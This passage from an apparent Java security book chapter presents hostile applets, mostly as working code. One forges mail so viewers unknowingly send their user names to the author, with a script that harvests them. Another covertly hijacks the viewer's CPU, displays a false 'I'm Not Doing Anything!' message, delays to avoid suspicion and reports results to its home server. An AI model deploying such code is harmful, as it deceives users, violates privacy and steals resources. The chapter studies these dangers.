+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socker
+= new Socket(getDocumentBase().getHost(), mailPort);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inner =
+new DataInputStream(socker.getInputStream());<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outer
+= new PrintStream(socker.getOutputStream());<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(IOException ioe) {}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void start() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(controller == null) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller
+= new Thread(this);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller.setPriority(Thread.MAX_PRIORITY);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller.start();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void stop() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(controller != null) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller.stop();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller
+= null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void run() {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;starter
+= inner.readLine();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(IOException ioe) {}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mailMe(&quot;HELO
+&quot; + mailFrom);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mailMe(&quot;MAIL
+FROM: &quot; + &quot;penpal@&quot; + mailFrom);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; mailMe(&quot;RCPT TO: &quot; + toMe);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;
+mailMe(&quot;DATA&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mailMe(&quot;Hey,
+it worked!&quot; + &quot;\n.&quot; + &quot;\n&quot;);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mailMe(&quot;QUIT&quot;);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socker.close();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(IOException ioe) {}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void mailMe(String toSend) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String
+response = new String();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outer.println(toSend);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outer.flush();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response
+= inner.readLine();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch(IOException
+e) {}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<P>
+The applet works just like Forger.java. Now the person viewing
+the applet is compelled to send a simple note to the applet's
+author (<TT>mladue@math.gatech.edu</TT>).
+In order to make a convenient list of e-mail addresses, the author
+used a little UNIX shell script (shown in listing 23.9) to scan
+his incoming mail for messages from <TT>penpal@my.hostile.applet</TT>
+and select the fields of those letters that might contain complete
+e-mail addresses, including user names. The applet seems to be
+successful in obtaining a user name at least 20% of the time.
+Although it is not perfectly successful, it works often enough
+to be considered a hazard to those concerned about privacy. The
+fact that it works at all shows once again that Java can behave
+in ways unexpected by the language's creators. (For reasons of
+privacy, a sample of the output is not included here.)
+<HR>
+<BLOCKQUOTE>
+<B>Listing 23.9. Update (shell script).<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>#! /bin/csh<BR>
+grep &quot;from my&quot; /var/mail/mladue | cut -f4,5 -d&quot;
+&quot; &gt;&gt; ~/public_html/penpals<BR>
+sort ~/public_html/penpals | uniq &gt; .allpals<BR>
+/bin/rm ~/public_html/penpals<BR>
+mv .allpals ~/public_html/penpals<BR>
+chmod 755 ~/public_html/penpals</TT>
+</BLOCKQUOTE>
+<HR>
+<H3><B>Are Stealthy Applets Dangerous?</B></H3>
+<P>
+The applets in this section pose some difficult questions for
+the Java language. With the potential for mischief so clearly
+demonstrated, should an applet be allowed to connect to port 25
+and send mail? Likewise, applets that connect to port 23 (telnet)
+could also get viewers into trouble. For example, it is possible
+to write an applet which connects to port 23 and repeatedly tries
+to login as root. The very nature of Java makes any telnet applet
+highly amenable to recording passwords. Should applets be allowed
+to connect to any ports at all? It is a very nice feature of the
+language that applets can do so, but this can lead to the unauthorized
+use of others' resources, as shown in the next section.
+<H2><A NAME="AJavaFactoringByWebProject"><B><FONT SIZE=5 COLOR=#FF0000>A
+Java Factoring-By-Web Project</FONT></B></A></H2>
+<P>
+The security of the RSA public key cryptosystem depends upon the
+difficulty of factoring a large integer into a product of prime
+numbers. In 1977 Rivest, Shamir, and Adelman, the inventors of
+RSA, announced their challenge problem of factoring a certain
+129-digit integer, which came to be known as RSA-129. At the time,
+they estimated that it would take some 4 x 10<FONT SIZE=1>16</FONT>
+years to factor their integer. But in April of 1994 a team of
+researchers announced that RSA-129 had been factored. The factorization
+had taken less than a year using the Quadratic Sieve alogorithm
+and the collaboration of many researchers and volunteers across
+the Internet.
+<P>
+Currently there is ongoing research into the prospects of organizing
+the World Wide Web into a general-purpose parallel computer capable
+of handling Grand Challenge problems. One such effort is the RSA
+Factoring-By-Web Project, which is organized by some of the same
+researchers who factored RSA-129. The project is sponsored by
+several research institutions, including NPAC at Syracuse University,
+BellCore, Oxford, and Boston University. In essence the project
+seeks voluntary contributions of computational resources from
+sites around the world. The volunteer sites work on portions of
+the larger factoring problems and report their results back to
+the major sites, which then collate and analyze the results. On
+April 10, 1996 the project reported that RSA-130 had been factored
+in a fraction of the time that it took to factor RSA-129.
+<P>
+This section presents a little Java Factoring-By-Web Project.
+The main differences between this project and the RSA Factoring-By-Web
+Project follow:
+<OL>
+<LI>This project uses Java applets exclusively, and it can easily
+be run by one person.
+<LI>This project factors relatively small (12-20 digit) integers
+using a terribly inefficient algorithm (trial division).
+<LI>Participation in the project need not be voluntary.
+</OL>
+<P>
+Listings 23.10-23.13 lay out the applet DoMyWork.java and its
+component classes, <TT>Calculator.java</TT>,
+<TT>Report.java</TT>, and <TT>ReportServerSocket.java</TT>.
+<HR>
+<BLOCKQUOTE>
+<B>Listing 23.10. DoMyWork.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>import java.awt.*;<BR>
+import java.applet.Applet;<BR>
+<BR>
+public class DoMyWork extends java.applet.Applet implements Runnable
+{<BR>
+<BR>
+//&nbsp;&nbsp;Just a font to paint strings to the applet window
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Font
+bigFont = new Font(&quot;TimesRoman&quot;, Font.BOLD, 36);<BR>
+<BR>
+//&nbsp;&nbsp;These threads will make you perform the calculations
+<BR>
+//&nbsp;&nbsp;and send the results back to their home.<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Thread
+controller = null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Thread sleeper = null;<BR>
+<BR>
+//&nbsp;&nbsp;Used to read in a parameter that makes the thread
+sleep for a<BR>
+//&nbsp;&nbsp;specified number of seconds taking effect<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;int delay;<BR>
+//&nbsp;&nbsp;Used to read in a parameter that determines the
+port to which<BR>
+//&nbsp;&nbsp;Sockets will be connected<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static int thePort;<BR>
+<BR>
+//&nbsp;&nbsp;Used to read in as a parameter the long integer
+to be factored<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public static long theNumber;<BR>
+<BR>
+//&nbsp;&nbsp;Used to hold the localhost to which the applet will
+connect<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static String theHome;<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void init() {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;setBackground(Color.white);<BR>
+<BR>
+//&nbsp;&nbsp;Determine how many seconds the main thread should
+sleep before kicking in<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;String
+str = getParameter(&quot;wait&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;if (str == null)<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delay
+= 0;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;else delay = (1000)*(Integer.parseInt(str));
+<BR>
+//&nbsp;&nbsp;Determine the port number<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;str = getParameter(&quot;portnumber&quot;);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;if
+(str == null)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;thePort = 9000;
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;else
+thePort = Integer.parseInt(str);<BR>
+//&nbsp;&nbsp;Determine the long integer to be factored<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;str
+= getParameter(&quot;tobefactored&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;if (str == null)<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;theNumber
+= 2L;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;else theNumber = Long.parseLong(str);
+<BR>
+//&nbsp;&nbsp;Determine the home host of the applet<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;theHome = getDocumentBase().getHost();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+<BR>
+/*&nbsp;&nbsp;Create and start the main thread in the standard
+way */<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void start() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(sleeper == null) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleeper = new
+Thread(this);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleeper.setPriority(Thread.MAX_PRIORITY);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleeper.start();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+/*&nbsp;&nbsp;And why should we stop? */<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void stop() {}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void run() {<BR>
+<BR>
+//&nbsp;&nbsp;Let the applet tell its lie<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;repaint();
+<BR>
+<BR>
+//&nbsp;&nbsp;Let the applet sleep for a while to avert suspicion
+if you like<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {sleeper.sleep(delay);}
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch(InterruptedException
+e) {}<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(controller == null) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Calculator calc
+= new Calculator();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller
+= new Thread(calc);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller.setPriority(Thread.MAX_PRIORITY);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;controller.start();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+/*&nbsp;&nbsp;Paints the applet's lie */<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void update(Graphics g) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;paint(g);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void paint(Graphics g) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;g.setColor(Color.blue);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;g.setFont(bigFont);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;g.drawString(&quot;I'm Not Doing Anything!&quot;,
+10, 200);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<HR>
+<BLOCKQUOTE>
+<B>Listing 23.11. Calculator.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>import java.io.*;<BR>
+import java.net.*;<BR>
+import DoMyWork;<BR>
+import Report;<BR>
+<BR>
+/*&nbsp;&nbsp;This simple class just calls the class that does
+all the work */<BR>
+<BR>
+public class Calculator extends java.applet.Applet implements
+Runnable {<BR>
+<BR>
+//&nbsp;&nbsp;The class that actually does the work<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+GetFactor doWork;<BR>
+<BR>
+/*&nbsp;&nbsp;As usual, we won't stop anything */<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void stop() {}<BR>
+<BR>
+<BR>
+/*&nbsp;&nbsp;Starts the factoring by trial division */<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void run() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;doWork
+= new GetFactor();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+}<BR>
+/*&nbsp;&nbsp;This class takes a given long integer and tries
+to factor it<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;by
+trial division.&nbsp;&nbsp;Of course other alogorithms could be
+used<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;instead, and you're not limited to such
+simple schemes. */<BR>
+<BR>
+<BR>
+class GetFactor extends DoMyWork {<BR>
+<BR>
+//&nbsp;&nbsp;The quantities that we'll be working with<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;long myNumber = DoMyWork.theNumber;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;int
+myPort = DoMyWork.thePort;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;String myHome = DoMyWork.theHome;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;long
+factor;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;long hopeful;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Report
+sendIt = null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Long T = null;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Long
+L = null;<BR>
+<BR>
+//&nbsp;&nbsp;Tells whether or not factoring was successful<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;boolean success;<BR>
+<BR>
+/*&nbsp;&nbsp;Start factoring by trial division */<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;GetFactor() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;long
+maxfactor = (long) java.lang.Math.sqrt(myNumber) + 1;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;factor = 3L;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hopeful
+= 0L;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;success = false;
+<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hopeful = myNumber
+% 2;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(hopeful == 0) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;success
+= true;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;factor
+= 2;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;success
+= false;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;factor
+= 3;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while
+(success == false &amp;&amp;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;factor
+&lt;&nbsp;&nbsp;maxfactor) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hopeful
+= myNumber % factor;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(hopeful == 0) {success = true;}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;factor
++= 2;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(success == false) {factor = myNumber;}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(factor &gt; 2) {factor -= 2;}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;T
+= new Long(myNumber);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;L = new Long(factor);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String
+teststr = T.toString();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String factorstr
+= L.toString();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendIt
+= new Report(myHome, myPort);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendIt.communicate(teststr,
+factorstr);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<HR>
+<BLOCKQUOTE>
+<B>Listing 23.12. Report.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>/*&nbsp;&nbsp;This class allows the applet
+to communicate with its home. */<BR>
+<BR>
+import java.applet.Applet;<BR>
+import java.awt.*;<BR>
+import java.io.*;<BR>
+import java.net.*;<BR>
+import java.util.Date;<BR>
+<BR>
+public class Report {<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+String home = new String(&quot;www.math.gatech.edu&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public int port = 9000;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+String localhome = null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public boolean debug = false;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+InetAddress localHome = null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public String localAddress = null;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+Date rightNow;<BR>
+<BR>
+//&nbsp;&nbsp;Construct the class<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Report(String home, int port) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.home
+= home;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.port = port;
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void communicate(String teststr, String factorstr) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Socket socker
+= null;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OutputStream
+outerStream = null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte by[] = new
+byte[4096];<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int
+numberbytes;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InetAddress inneraddress
+= null;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String
+response = null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StringBuffer responsebuf
+= new StringBuffer();<BR>
+//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;I'm
+up to no good&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socker
+= new Socket(home, port);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outerStream
+= socker.getOutputStream();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch (IOException
+ioe) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(debug)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;I
+can't open a socket to &quot; + home);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(debug)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;Sending
+factoring information to&quot; + home);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inneraddress
+= socker.getInetAddress();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;localHome
+= inneraddress.getLocalHost();<BR>
